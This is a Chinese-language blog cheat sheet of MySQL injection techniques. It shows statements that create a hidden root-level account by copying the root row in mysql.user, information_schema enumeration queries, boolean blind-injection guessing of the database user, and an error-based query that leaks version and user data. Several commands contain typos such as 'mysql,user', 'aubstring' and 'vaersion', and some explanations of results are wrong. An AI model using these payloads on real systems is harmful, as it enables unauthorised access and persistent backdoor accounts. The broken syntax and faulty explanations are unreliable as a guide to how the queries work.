---
title: 常见的sql注入方式
date: 2020-04-15 11:44:01
tags: sql注入
---

# sql注入提权后创建一个账户

在系统自带的mysql数据库中有常用的两个表`db`和`user`,`columns_priv`,

## 创建一个普通账户
`insert into user (host,user,password) values('%','admin3',password('abc'));`
查找到刚才插入的数据
`select host,user,password from mysql,user;`
刷新权限
`flush privileges`

## 创建一个超级账户(通过拷贝的方法)
`create table tmp select *from mysql,user where user='root' limit 1;`
更新
`update tmp set host='%',user='admin4',password=password('abc');`
刷新权限
`flush privileges`
查找到刚才插入的数据
`select host,user,password from mysql,user;`


# 以下三种是通过information_schema元数据字典方式

## 获得当前实例所有数据库名
- `select databases();`
- `select schema_name from information_schema.schemata;`
- `select distinct table_schema from information_schema.tables;`

##  获得当前数据库所有表名
`select database()  //当前的数据库名`
-  `show tables;`
-  `select table_name from information_schema.tables where table_schema=database();`

## 活得当前表所有字段
-  `select column_name from information_schema.columns where table_schema=database() and table_name='表名';`

# 探子回报函数应用

## 查看当前用户名
- `select user();`
- `select current_user();`
- `select session_user();`

## 查看当前版本
- `select version();`

## 猜测当前数据库长度
- `select length(database())>3` 如果返回是0，则说明这个数据库长度为3，如果返回是1,则长度不是这个数

## 取出字符(取出数据库左边开始数的一个字符)
- `select left(database(),1);`
  
## 取出的字符比较
- `select left(database(),a)>'a';`如果返回的是1，则这个字符大于a，如果返回的是0，则这个字符就是取出来的数。

## 自定义取出一串字符
- `select aubstring(database(),1,2);`这个意思是，从第一个字符开始取，要取出两个字符。

## 返回一个字符的所在位置
- `select position('@' in user());`
- `delect locate('@',user());`

## 盲注猜测用户名和密码
- 1.先验证用户名有多少个字符
`select *from users where uid=1003 and length(user())>4;`
- 2.对@位置的猜测
`select *from users whereuid=1003 and position('@' in user())>1;`
- 3.用户名逐个猜测
`select *from user where uid=1003 and left(user(),1)='a';`
`select *from user where uid=1003 and substring(user(),2,1)='b';`

# 自报家底函数

## 随机函数,返回0到1之间的小数
`select rand();`

## 获得整数，四舍五入
`select round(rand()*2);`  //0 1 2

## 向下取整
抹掉小数，没有四舍五入
`select floor(rand()*2)`  //0 1

## 拼接
`select concat('abc','def')`  //abcdef

## 得出某个相同字段的组数
`select <字段>,count(*) from <表名> group by <字段>`

## 某个相同字段显示一行id,
``select <字段1>,group_concat(<字段2>) from <表名> group by <字段1>;`

## 暴露系统用户名敏感信息
`select count(*),concat(vaersion(),floor(rand()*2),user()) as a from <表名> group by a ;`
